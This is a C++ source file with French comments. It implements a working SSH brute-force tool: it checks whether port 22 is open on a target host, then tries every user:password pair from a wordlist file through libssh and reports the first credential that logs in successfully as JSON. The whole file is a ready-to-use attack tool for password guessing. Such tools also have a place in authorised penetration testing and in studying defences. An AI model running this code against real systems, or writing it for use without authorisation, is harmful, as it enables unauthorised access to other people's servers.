#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <libssh/libssh.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <cstring>
#include <unistd.h> // Pour getcwd
#include <nlohmann/json.hpp>

using json = nlohmann::json;
/**
 * @brief Vérifier si un port est ouvert sur un hôte
 * @param host  Adresse IP ou nom d'hôte
 * @param port  Port à scanner
 * @param timeout_ms  Timeout en millisecondes
 * @return  true si le port est ouvert, false sinon
 */
bool isPortOpen(const std::string &host, int port, int timeout_ms) {
    struct sockaddr_in addr;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "Erreur de création du socket : " << strerror(errno) << std::endl;
        return false;
    }

    // Configuration du timeout
    struct timeval timeout;
    timeout.tv_sec = timeout_ms / 1000;
    timeout.tv_usec = (timeout_ms % 1000) * 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    // Configuration du socket en non-bloquant
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    // Préparation de l'adresse
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    // Conversion de l'adresse IP
    if (inet_pton(AF_INET, host.c_str(), &addr.sin_addr) <= 0) {
        // Si l'adresse IP n'est pas valide, essayer de résoudre le nom d'hôte
        struct hostent *he = gethostbyname(host.c_str());
        if (he == nullptr) {
            std::cerr << "Erreur de résolution du nom d'hôte : " << host << std::endl;
            close(sock);
            return false;
        }
        memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    }

    // Tentative de connexion
    int res = connect(sock, (struct sockaddr *) &addr, sizeof(addr));

    if (res < 0) {
        if (errno == EINPROGRESS) {
            // Attente de connexion avec select
            fd_set fdset;
            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);

            res = select(sock + 1, NULL, &fdset, NULL, &timeout);
            if (res > 0) {
                // Vérifier si la connexion a réussi
                int so_error;
                socklen_t len = sizeof(so_error);
                getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
                if (so_error == 0) {
                    close(sock);
                    return true;
                } else {
                    std::cerr << "Erreur de connexion : " << strerror(so_error) << std::endl;
                }
            } else {
                std::cerr << "Erreur de select ou timeout : " << strerror(errno) << std::endl;
            }
        } else {
            std::cerr << "Erreur de connexion : " << strerror(errno) << std::endl;
        }
        close(sock);
        return false;
    }

    close(sock);
    return true;
}

/**
 *  @brief Tester une connexion SSH
 * @param host  Adresse IP ou nom d'hôte
 * @param user  Nom d'utilisateur
 * @param password  Mot de passe
 * @return  true si la connexion est réussie, false sinon
 */
bool trySSHLogin(const std::string &host, const std::string &user, const std::string &password) {
    ssh_session session = ssh_new();
    if (session == nullptr) {
        std::cerr << "Erreur de création de la session SSH" << std::endl;
        return false;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
    ssh_options_set(session, SSH_OPTIONS_USER, user.c_str());

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        std::cerr << "Erreur de connexion à " << host << " : " << ssh_get_error(session) << std::endl;
        ssh_free(session);
        return false;
    }

    rc = ssh_userauth_password(session, nullptr, password.c_str());
    if (rc == SSH_AUTH_SUCCESS) {
        ssh_disconnect(session);
        ssh_free(session);
        return true;
    }

    ssh_disconnect(session);
    ssh_free(session);
    return false;
}

/**
 *  @brief Fonction principale
 * @param argc  Nombre d'arguments
 * @param argv  Tableau des arguments
 * @return  Code de retour
 */
int main(int argc, char *argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <IP> <wordlist_path>" << std::endl;
        return 1;
    }

    std::string host = argv[1];
    std::string wordListPath = argv[2];
    int port = 22; // Port SSH
    int timeout_ms = 5000; // Timeout de 5 secondes
    json result;

    if (isPortOpen(host, port, timeout_ms)) {
        result["ip"] = host;
        result["message"] = "Le port 22 (SSH) est ouvert";

        std::ifstream file(wordListPath);
        if (!file.is_open()) {
            result["error"] = "Erreur lors de l'ouverture du fichier de credentials";
            std::cout << result.dump(4) << std::endl;
            return 1;
        }

        std::string line;
        bool success = false;
        while (std::getline(file, line)) {
            size_t delimiter_pos = line.find(':');
            if (delimiter_pos == std::string::npos) {
                continue;
            }

            std::string user = line.substr(0, delimiter_pos);
            std::string password = line.substr(delimiter_pos + 1);

            if (trySSHLogin(host, user, password)) {
                result["user"] = user;
                result["password"] = password;
                result["message"] = "Connexion réussie";
                success = true;
                break;
            }
        }

        if (!success) {
            result["message"] = "Aucun mot de passe trouvé";
        }

        file.close();
    } else {
        result["ip"] = host;
        result["message"] = "Le port 22 (SSH) est fermé";
    }

    std::cout << result.dump(4) << std::endl;
    return 0;
}